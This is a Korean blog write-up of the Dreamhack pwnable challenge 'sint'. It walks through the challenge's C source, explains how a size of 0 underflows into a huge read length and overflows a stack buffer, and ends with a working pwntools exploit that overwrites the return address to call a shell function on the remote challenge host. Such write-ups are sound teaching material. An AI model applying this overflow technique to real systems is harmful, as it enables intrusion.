---
layout: post
title: [Dreamhack] sint
subtitle: Dreamhack-Pwnable sint
categories: Pwnable
tags: [Pwnable, dreakhack, Shell, Pentest]
---

**본 문제는 Dreamhack을 통해서 풀어 보실 수 있습니다.**

**해답을 이해하며 생각을 해보면서 풀이 해보시길 바랍니다.**

## 문제 내용

문제는 <a href = "https://dreamhack.io/wargame/challenges/">dreamhack.io</a>를 들어가시면 확인할 수 있습니다.

<p align="center">
<img src ="https://user-images.githubusercontent.com/78135526/197375925-9c65298b-94ea-4c93-a528-a1a9be80abe9.jpg" width = 500>
</p>

이 문제는 **Integer Issues**라 하는 Reference를 가지고 있고 보호기법으로 보면 NX bit만 활성화 되어 있는 것을 알 수 있다. 

## 문제 풀이

```C
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void alarm_handler()
{
    puts("TIME OUT");
    exit(-1);
}

void initialize()
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

void get_shell()
{
    system("/bin/sh");
}

int main()
{
    char buf[256];
    int size;

    initialize();
    signal(SIGSEGV, get_shell);

    printf("Size: ");
    scanf("%d", &size);

    if (size > 256 || size < 0)
    {
        printf("Buffer Overflow!\n");
        exit(0);
    }

    printf("Data: ");
    read(0, buf, size - 1);

    return 0;
}
```

이 코드에서는 `get_shell`을 통한 `system` 호출이 가능하다.

```C
if (size > 256 || size < 0)
{
   printf("Buffer Overflow!\n");
   exit(0);
}
```

`size`라는 변수를 int형으로 입력 받아 256보다 크거나 0보다 작으면 프로그램이 종료된다.

```C
printf("Data: ");
read(0, buf, size - 1);
```

우리가 입력받은 size보다 1만큼 작게 Data를 입력받아 `buf[256]`에 저장하는 것을 알 수 있다.

`size`변수는 int형으로 맨 앞 자리는 부호를 설정하는 값이다. 즉 -2^31 ~ 2^31-1의 범위를 가지게 된다. 

`size`가 0이고 -1을 하게 되면 컴퓨터는 2의 보수를 취해 값을 변경하게 된다.

따라서, `size - 1`를 2진수로 표현하면 **1111 1111 1111 1111**, 엄청 큰 값을 가지게 된다.

* **read 함수**

```C
#include <unistd.h>

ssize_t read(int fd, void *buf, size_t nbytes);
```

입력받는 크기에 해당 형은 `size_t`로 unsigned int로 부호없는 정수형이다. 즉, 2의 보수처럼 맨 앞 자리가 부호를 뜻하지 않게 된다는 것이다.

그래서 `size - 1`의 2진수의 값을 매우 큰 값으로 받아드려 BOF가 가능하게 된다.

`system`을 불러오는 `get_shell`함수도 존재하므로, 전체 크기 **0x104** + **SFP 4byte** + **get_shell 주소**로 payload를 전송하면 해결이 가능하다.

```python
from pwn import *

# p = process('./sint')
p = remote('host3.dreamhack.games', port)
elf = ELF('./sint')

get_shell = elf.symbols['get_shell']
payload = b''

p.recvuntil('Size: ')
p.sendline('0')

payload += b'A' * 0x108 + p32(get_shell)
p.recvuntil('Data: ')
p.send(payload)

p.interactive()
```